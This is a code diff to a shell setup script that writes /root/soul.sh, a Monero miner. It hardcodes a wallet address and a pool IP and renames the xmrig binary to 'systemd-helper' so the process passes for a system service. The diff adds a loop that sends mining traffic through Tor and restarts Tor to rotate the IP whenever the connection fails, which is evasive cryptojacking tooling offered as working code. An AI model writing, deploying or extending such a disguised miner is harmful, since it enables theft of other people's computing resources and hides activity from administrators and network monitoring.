@@ -82,6 +82,7 @@ apt update && apt install -y sudo nano curl wget
 # Create soul.sh miner script
 cat << 'EOM' > /root/soul.sh
 #!/bin/bash
+
 WALLET="49xs4gWaPLWFzkLbmFgBdm9V9ZU2rf7djF7kUVE11seJgyLEt6GekKpTVhugLXD8tq7gHoMtiqBRj7TsVWdKN5m6Kshxpsv"
 POOL="31.97.58.247:8080"
 WORKER="king3"
@@ -90,21 +91,19 @@ echo "[+] Starting setup..."
 
 install_dependencies() {
     apt update -y
-    sudo apt update
     sudo apt install tor curl net-tools -y
-
 }
 
 start_tor() {
-    sudo service tor start
-    tor &
-    echo "[+] Starting Tor..."
-    tor & sleep 10
+    echo "[+] Restarting Tor with new circuit..."
+    sudo pkill tor >/dev/null 2>&1
+    sudo service tor restart
+    sleep 10
 }
 
 test_tor() {
-    echo "[+] Checking Tor proxy IP..."
-    curl --socks5 127.0.0.1:9050 https://ifconfig.me
+    echo "[+] Current Tor IP:"
+    curl --socks5 127.0.0.1:9050 https://ifconfig.me || echo "[!] Tor failed."
     echo ""
 }
 
@@ -114,15 +113,28 @@ build_xmrig() {
     mv xmrig-6.21.0 xmrig
     cd xmrig
     mv xmrig systemd-helper
-    rm -rf xmrig.tar.gz
+    rm -rf ../xmrig.tar.gz
 }
 
 start_mining() {
-    chmod +x ./systemd-helper
-    torsocks ./systemd-helper -o $POOL -u $WALLET -p $WORKER -k --coin monero --donate-level=1
+    while true; do
+        echo "[+] Launching miner via Tor..."
+        torsocks ./systemd-helper -o $POOL -u $WALLET -p $WORKER -k --coin monero --donate-level=1 2>&1 | tee log.txt
+
+        if grep -q "We tried for 15 seconds to connect" log.txt; then
+            echo "[!] Detected Tor failure. Rotating IP and retrying..."
+            cd ..
+            start_tor
+            test_tor
+            cd xmrig
+        else
+            echo "[✓] Mining exited without Tor connection errors."
+            break
+        fi
+    done
 }
 
-# MAIN EXECUTION
+# --- MAIN ---
 if [ ! -f "./xmrig/systemd-helper" ]; then
     install_dependencies
     build_xmrig
@@ -134,6 +146,10 @@ test_tor
 cd xmrig
 start_mining
 EOM
+
+
+
+
 
 # Make all .sh scripts executable
 chmod +x /root/*.sh
